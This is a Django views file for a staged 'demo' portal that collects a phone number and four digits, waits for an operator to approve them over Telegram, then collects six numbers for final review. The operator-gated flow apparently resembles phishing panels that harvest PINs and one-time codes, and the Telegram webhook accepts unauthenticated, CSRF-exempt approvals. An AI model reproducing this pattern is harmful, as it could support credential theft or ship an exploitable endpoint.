import json
from django.contrib import messages
from django.http import JsonResponse, HttpResponse
from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST, require_http_methods
from django.utils import timezone
from .models import DemoSession, DemoEvent
from .telegram import send_four_review, send_six_review, answer_callback, edit_message


def home(request):
    return render(request, "portal/home.html")


@require_POST
def start_demo(request):
    platform = request.POST.get("platform", "")
    valid = dict(DemoSession.PLATFORM_CHOICES)
    if platform not in valid:
        messages.error(request, "Choose one of the listed environments.")
        return redirect("home")
    session = DemoSession.objects.create(platform=platform)
    DemoEvent.objects.create(session=session, event_type="started", description="Session created.")
    request.session["demo_session_id"] = session.pk
    return redirect("amount")


def current_session(request):
    sid = request.session.get("demo_session_id")
    if not sid:
        return None
    return DemoSession.objects.filter(pk=sid).first()


def amount(request):
    session = current_session(request)
    if not session:
        return redirect("home")
    return render(request, "portal/amount.html", {"session": session})


@require_POST
def confirm_amount(request):
    session = current_session(request)
    if not session:
        return redirect("home")
    try:
        points = int(request.POST.get("points", ""))
    except (TypeError, ValueError):
        points = 0
    if points < 1 or points > 10000:
        messages.error(request, "Enter an amount between 1 and 10,000.")
        return redirect("amount")
    session.demo_points = points
    session.save(update_fields=["demo_points"])
    DemoEvent.objects.create(
        session=session,
        event_type="points_set",
        description=f"{points:,} virtual points selected.",
    )
    return redirect("four_numbers")


def four_numbers(request):
    session = current_session(request)
    if not session:
        return redirect("home")
    # If already past this stage, send them forward
    if session.status == "pending_four":
        return redirect("waiting_four")
    if session.status in ("four_approved", "pending_six", "approved", "rejected"):
        return redirect("six_numbers")
    if session.status == "four_rejected":
        return redirect("waiting_four")
    return render(request, "portal/four_numbers.html", {"session": session})


@require_POST
def save_four_numbers(request):
    session = current_session(request)
    if not session:
        return redirect("home")
    if session.status not in ("started",):
        # Already submitted
        return redirect("waiting_four")

    values = request.POST.getlist("numbers")
    phone = (request.POST.get("phone") or "").strip()
    if (
        len(values) != 4
        or any(not v.isdigit() or not 0 <= int(v) <= 9 for v in values)
        or len(set(values)) != 4
    ):
        messages.error(request, "Choose four different digits from 0 to 9.")
        return redirect("four_numbers")
    if not phone or len(phone) < 9:
        messages.error(request, "Enter a valid phone number.")
        return redirect("four_numbers")

    session.four_numbers = ", ".join(values)
    session.phone_number = phone
    session.status = "pending_four"
    session.save(update_fields=["four_numbers", "phone_number", "status"])
    DemoEvent.objects.create(
        session=session,
        event_type="pending_four",
        description="Four digits + phone submitted — waiting for admin approval.",
    )

    # Stage 1 Telegram notification
    send_four_review(session)

    return redirect("waiting_four")


def waiting_four(request):
    """User waits here until admin approves/rejects the four digits + phone."""
    session = current_session(request)
    if not session:
        return redirect("home")

    if session.status == "four_approved":
        return redirect("six_numbers")
    if session.status == "four_rejected":
        return render(request, "portal/waiting_four.html", {"session": session, "rejected": True})
    if session.status not in ("pending_four",):
        # Unexpected state
        if session.status in ("pending_six", "approved", "rejected"):
            return redirect("success")
        return redirect("four_numbers")

    return render(request, "portal/waiting_four.html", {"session": session, "rejected": False})


def six_numbers(request):
    session = current_session(request)
    if not session:
        return redirect("home")
    # Gate: only allow if four was approved
    if session.status == "pending_four":
        return redirect("waiting_four")
    if session.status == "four_rejected":
        return redirect("waiting_four")
    if session.status not in ("four_approved", "pending_six", "approved", "rejected"):
        return redirect("four_numbers")
    if session.status in ("pending_six", "approved", "rejected"):
        return redirect("success")
    return render(request, "portal/six_numbers.html", {"session": session})


@require_POST
def save_six_numbers(request):
    session = current_session(request)
    if not session:
        return redirect("home")
    if session.status != "four_approved":
        messages.error(request, "You must wait for approval of your four digits first.")
        return redirect("waiting_four")

    values = request.POST.getlist("numbers")
    if (
        len(values) != 6
        or any(not v.isdigit() or not 0 <= int(v) <= 49 for v in values)
        or len(set(values)) != 6
    ):
        messages.error(request, "Choose six different numbers from 0 to 49.")
        return redirect("six_numbers")

    session.six_numbers = ", ".join(values)
    session.status = "pending_six"
    session.save(update_fields=["six_numbers", "status"])
    DemoEvent.objects.create(
        session=session,
        event_type="pending_six",
        description="Six numbers submitted — waiting for final admin review.",
    )

    # Stage 2 Telegram notification
    send_six_review(session)

    return redirect("success")


def success(request):
    session = current_session(request)
    if not session:
        return redirect("home")
    return render(request, "portal/success.html", {"session": session})


def reset_demo(request):
    request.session.pop("demo_session_id", None)
    return redirect("home")


@csrf_exempt
@require_http_methods(["POST"])
def telegram_webhook(request):
    """
    Telegram webhook endpoint.
    Supports:
      approve_four:<id> / reject_four:<id>
      approve_six:<id>  / reject_six:<id>
    """
    try:
        payload = json.loads(request.body.decode("utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError):
        return HttpResponse(status=400)

    callback = payload.get("callback_query")
    if not callback:
        return HttpResponse("ok")

    data = callback.get("data") or ""
    callback_id = callback.get("id")
    message = callback.get("message") or {}
    chat_id = str(message.get("chat", {}).get("id", ""))
    message_id = message.get("message_id")

    valid_prefixes = ("approve_four:", "reject_four:", "approve_six:", "reject_six:")
    if not data.startswith(valid_prefixes):
        answer_callback(callback_id, "Unknown action")
        return HttpResponse("ok")

    action, _, raw_id = data.partition(":")
    try:
        session_id = int(raw_id)
    except ValueError:
        answer_callback(callback_id, "Invalid session")
        return HttpResponse("ok")

    session = DemoSession.objects.filter(pk=session_id).first()
    if not session:
        answer_callback(callback_id, "Session not found")
        return HttpResponse("ok")

    # ---------- STAGE 1: Four + Phone ----------
    if action in ("approve_four", "reject_four"):
        if session.status != "pending_four":
            answer_callback(callback_id, f"Already {session.status}")
            return HttpResponse("ok")

        if action == "approve_four":
            session.status = "four_approved"
            session.save(update_fields=["status"])
            DemoEvent.objects.create(
                session=session,
                event_type="four_approved",
                description="Four digits + phone approved via Telegram. User can continue.",
            )
            answer_callback(callback_id, "Approved — user can enter 6 numbers ✅")
            new_text = (
                f"✅ STAGE 1 APPROVED\n\n"
                f"Platform: {session.get_platform_display()}\n"
                f"Virtual points: {session.demo_points:,}\n"
                f"Phone: {session.phone_number}\n"
                f"Four digits: {session.four_numbers}\n"
                f"Reference: {str(session.reference)[:8]}\n"
                f"Status: Four approved — waiting for six numbers"
            )
        else:
            session.status = "four_rejected"
            session.reviewed_at = timezone.now()
            session.save(update_fields=["status", "reviewed_at"])
            DemoEvent.objects.create(
                session=session,
                event_type="four_rejected",
                description="Four digits + phone rejected via Telegram.",
            )
            answer_callback(callback_id, "Rejected ❌")
            new_text = (
                f"❌ STAGE 1 REJECTED\n\n"
                f"Platform: {session.get_platform_display()}\n"
                f"Virtual points: {session.demo_points:,}\n"
                f"Phone: {session.phone_number}\n"
                f"Four digits: {session.four_numbers}\n"
                f"Reference: {str(session.reference)[:8]}\n"
                f"Status: Rejected at stage 1"
            )

        if chat_id and message_id:
            edit_message(chat_id, message_id, new_text)
        return HttpResponse("ok")

    # ---------- STAGE 2: Six numbers (final) ----------
    if action in ("approve_six", "reject_six"):
        if session.status != "pending_six":
            answer_callback(callback_id, f"Already {session.status}")
            return HttpResponse("ok")

        if action == "approve_six":
            session.status = "approved"
            session.reviewed_at = timezone.now()
            session.save(update_fields=["status", "reviewed_at"])
            DemoEvent.objects.create(
                session=session,
                event_type="approved",
                description="Final selection approved via Telegram.",
            )
            answer_callback(callback_id, "Final approval ✅")
            new_text = (
                f"✅ FINAL APPROVED\n\n"
                f"Platform: {session.get_platform_display()}\n"
                f"Virtual points: {session.demo_points:,}\n"
                f"Phone: {session.phone_number}\n"
                f"Four digits: {session.four_numbers}\n"
                f"Six numbers: {session.six_numbers}\n"
                f"Reference: {str(session.reference)[:8]}\n"
                f"Status: Approved"
            )
        else:
            session.status = "rejected"
            session.reviewed_at = timezone.now()
            session.save(update_fields=["status", "reviewed_at"])
            DemoEvent.objects.create(
                session=session,
                event_type="rejected",
                description="Final selection rejected via Telegram.",
            )
            answer_callback(callback_id, "Rejected ❌")
            new_text = (
                f"❌ FINAL REJECTED\n\n"
                f"Platform: {session.get_platform_display()}\n"
                f"Virtual points: {session.demo_points:,}\n"
                f"Phone: {session.phone_number}\n"
                f"Four digits: {session.four_numbers}\n"
                f"Six numbers: {session.six_numbers}\n"
                f"Reference: {str(session.reference)[:8]}\n"
                f"Status: Rejected"
            )

        if chat_id and message_id:
            edit_message(chat_id, message_id, new_text)
        return HttpResponse("ok")

    answer_callback(callback_id, "Unknown action")
    return HttpResponse("ok")
